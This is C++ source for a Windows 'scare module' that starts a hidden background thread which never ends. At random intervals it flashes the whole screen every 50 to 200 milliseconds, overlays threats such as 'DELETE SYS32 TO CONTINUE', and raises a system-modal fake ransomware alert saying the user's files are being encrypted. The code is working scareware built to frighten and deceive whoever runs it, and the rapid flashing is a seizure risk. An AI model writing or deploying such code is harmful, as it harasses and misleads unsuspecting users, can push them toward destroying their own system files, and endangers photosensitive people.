#include <windows.h>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <thread>

std::mt19937 rng((unsigned)std::chrono::steady_clock::now().time_since_epoch().count());

void FlashScreen() {
    HDC hdc = GetDC(NULL);
    if (!hdc) return;

    HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
    HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
    HBRUSH redBrush = CreateSolidBrush(RGB(255, 0, 0));
    HBRUSH greenBrush = CreateSolidBrush(RGB(0, 255, 0));
    HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));

    std::vector<HBRUSH> brushes = {whiteBrush, blackBrush, redBrush, greenBrush, blueBrush};

    for (int i = 0; i < 50; i++) {
        RECT rect;
        GetClientRect(GetDesktopWindow(), &rect);
        int random = std::uniform_int_distribution<int>(0, 4)(rng);
        FillRect(hdc, &rect, brushes[random]);

        std::string messages[] = {
            "YOU'RE BEING WATCHED",
            "THEY KNOW WHERE YOU LIVE",
            "DELETE SYS32 TO CONTINUE",
            "YOUR FILES ARE MINE",
            "DON'T TURN OFF THE PC",
            "I CAN HEAR YOU BREATHING",
            "HELLO, DARKNESS",
            "Я ВИЖУ ТЕБЯ"
        };
        int msgIdx = std::uniform_int_distribution<int>(0, 7)(rng);
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(255, 255, 255));
        DrawTextA(hdc, messages[msgIdx].c_str(), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        Sleep(std::uniform_int_distribution<int>(50, 200)(rng));
    }

    for (auto brush : brushes) {
        DeleteObject(brush);
    }
    ReleaseDC(NULL, hdc);
}

void ShowFullscreenImage() {
    HDC hdc = GetDC(NULL);
    if (!hdc) return;

    RECT rect;
    GetClientRect(GetDesktopWindow(), &rect);

    HBRUSH blackBrush = CreateSolidBrush(RGB(0, 0, 0));
    FillRect(hdc, &rect, blackBrush);

    SetBkMode(hdc, TRANSPARENT);
    SetTextColor(hdc, RGB(255, 0, 0));

    const char* face[] = {
        "  /\\_/\\  ",
        " ( o.o ) ",
        "  > ^ <  ",
        "  /   \\  ",
        " (     ) ",
        "  \\___/  ",
        "  U  U   "
    };

    for (int i = 0; i < 7; i++) {
        TextOutA(hdc, rect.left + rect.right / 2 - 20, rect.top + i * 30 + 100, face[i], (int)strlen(face[i]));
    }

    TextOutA(hdc, rect.left + rect.right / 2 - 100, rect.top + 350, "I'M INSIDE YOUR WALLS", 20);

    DeleteObject(blackBrush);
    ReleaseDC(NULL, hdc);
}

void ShowScaryMessage() {
    MessageBoxA(NULL,
        "Your system has been compromised.\n"
        "All your files are being encrypted.\n"
        "Do not turn off your computer.\n"
        "The process will take approximately 3 hours.",
        "SYSTEM WARNING",
        MB_OK | MB_ICONERROR | MB_SYSTEMMODAL | MB_SETFOREGROUND
    );
}

void ScreamerLoop() {
    while (true) {
        int delay = std::uniform_int_distribution<int>(3000, 15000)(rng);
        Sleep(delay);

        int effect = std::uniform_int_distribution<int>(0, 3)(rng);
        switch (effect) {
            case 0: FlashScreen(); break;
            case 1: ShowFullscreenImage(); break;
            case 2: ShowScaryMessage(); break;
            case 3:
                for (int i = 0; i < 10; i++) {
                    HDC hdc = GetDC(NULL);
                    RECT rect;
                    GetClientRect(GetDesktopWindow(), &rect);
                    HBRUSH brush = CreateSolidBrush(RGB(255, 0, 0));
                    FillRect(hdc, &rect, brush);
                    DeleteObject(brush);
                    ReleaseDC(NULL, hdc);
                    Sleep(50);
                    FlashScreen();
                }
                break;
        }
    }
}

void InitializeScareModule() {
    std::thread scareThread(ScreamerLoop);
    scareThread.detach();
}
